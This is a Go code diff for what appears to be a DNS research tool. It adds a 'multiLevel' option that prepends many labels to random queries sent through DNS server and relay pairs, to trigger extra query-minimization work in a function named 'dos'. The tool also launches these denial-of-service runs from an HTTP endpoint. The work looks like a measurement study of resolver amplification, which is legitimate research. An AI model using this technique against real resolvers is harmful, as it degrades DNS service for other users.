@@ -182,7 +182,7 @@ func main() {
 			if !exists {
 				qtype = dns.TypeA
 			}
-			app.dos(qtype)
+			go app.dos(qtype, true)
 			c.JSON(http.StatusOK, gin.H{
 				"msg": "ok",
 			})
@@ -193,12 +193,14 @@ func main() {
 			limitInt, err := strconv.Atoi(limit)
 			concurrentStr, _ := c.GetQuery("concurrent")
 			concurrentInt, err := strconv.Atoi(concurrentStr)
+			multiLevelStr, _ := c.GetQuery("multiLevel")
+			multiLevel := multiLevelStr == "true"
 
 			if err != nil {
 				limitInt = -1
 				concurrentInt = -1
 			}
-			go app.probe(limitInt, concurrentInt)
+			go app.probe(limitInt, concurrentInt, multiLevel)
 			c.JSON(http.StatusOK, gin.H{
 				"msg": "ok",
 			})
@@ -289,13 +291,13 @@ func main() {
 				fmt.Printf("rtt: %dms\n", rtt)
 			case "dos":
 				if len(args) == 0 {
-					app.dos(dns.TypeTXT)
+					app.dos(dns.TypeTXT, true)
 				} else {
 					qtype, exists := dns.StringToType[strings.ToUpper(args[0])]
 					if !exists {
 						qtype = dns.TypeTXT
 					}
-					app.dos(qtype)
+					app.dos(qtype, true)
 				}
 			}
 		}
@@ -395,7 +397,7 @@ func NowUnixMillion() int64 {
 	return timeNow().UnixMilli()
 }
 
-func (app *App) dos(qtype uint16) {
+func (app *App) dos(qtype uint16, multiLevel bool) {
 	// load prepared list
 	fout, err := os.OpenFile("send_result.csv", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
 	if err != nil {
@@ -447,7 +449,7 @@ func (app *App) dos(qtype uint16) {
 			variation, _ := strconv.ParseFloat(record[5], 64)
 
 			// make a query for {server}-{relay}-{#randomStr}-{index}.test.xxt.asia
-			q := app.buildQuery(server, relay, index, qtype)
+			q := app.buildQuery(server, relay, index, qtype, multiLevel)
 
 			// Sleep until sendTime
 			timeNow := NowUnixMillion()
@@ -501,8 +503,12 @@ func (app *App) dos(qtype uint16) {
 	fout.Close()
 }
 
-func (app *App) buildQuery(server string, relay string, index int, qtype uint16) *dns.Msg {
+func (app *App) buildQuery(server string, relay string, index int, qtype uint16, multiLevel bool) *dns.Msg {
 	domain := fmt.Sprintf("%s,%s.%s-%d.test.xxt.asia", server, relay, RandStringRunes(8), index)
+	// add many levels to trigger more query minimization
+	if multiLevel {
+		domain = "a.b.c.d.e.f.g.h.i.j.k.l." + domain
+	}
 	q := new(dns.Msg)
 	q.SetQuestion(dns.Fqdn(domain), qtype)
 	return q
@@ -522,7 +528,7 @@ type SRPair struct {
 	Relay  string
 }
 
-func (app *App) probe(limit int, maxConcurrent int) {
+func (app *App) probe(limit int, maxConcurrent int, multiLevel bool) {
 	// Iterate through all servers and relays
 	servers := app.proxy.serversInfo.inner
 	relays := app.proxy.registeredRelays
@@ -571,12 +577,9 @@ func (app *App) probe(limit int, maxConcurrent int) {
 		maxConcurrent = groupSize
 	}
 	countChannel := make(chan struct{}, maxConcurrent)
-	waitChannel := make(chan struct{})
-	if maxConcurrent > 0 {
-		defer func() {
-			<-waitChannel
-		}()
-	}
+	wg := sync.WaitGroup{}
+	wg.Add(min(iterTime*groupSize, limit))
+	defer wg.Wait()
 
 	for i := 0; i < iterTime; i++ {
 		for j := 0; j < groupSize; j++ {
@@ -588,9 +591,7 @@ func (app *App) probe(limit int, maxConcurrent int) {
 				countChannel <- struct{}{}
 				defer func() {
 					<-countChannel
-					if len(countChannel) == 0 {
-						close(waitChannel)
-					}
+					wg.Done()
 				}()
 
 				start := time.Now()
@@ -602,7 +603,7 @@ func (app *App) probe(limit int, maxConcurrent int) {
 
 				for reqSeq := 0; reqSeq < 10; reqSeq++ {
 					// Send query
-					q := app.buildQuery(server, relay, reqSeq, dns.TypeTXT)
+					q := app.buildQuery(server, relay, reqSeq, dns.TypeTXT, multiLevel)
 
 					sendTime := NowUnixMillion()
 					resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q)
@@ -656,7 +657,7 @@ func (app *App) randomQueryTest(num int, qtype uint16) {
 			// randomly select a relay
 			relay := app.proxy.registeredRelays[rand.Intn(len(app.proxy.registeredRelays))].getName()
 			// build query
-			q := app.buildQuery(server, relay, index, qtype)
+			q := app.buildQuery(server, relay, index, qtype, false)
 			// send query
 			resp, realRtt, err := app.proxy.ResolveQuery("tcp", server, relay, q)
 			if err != nil {
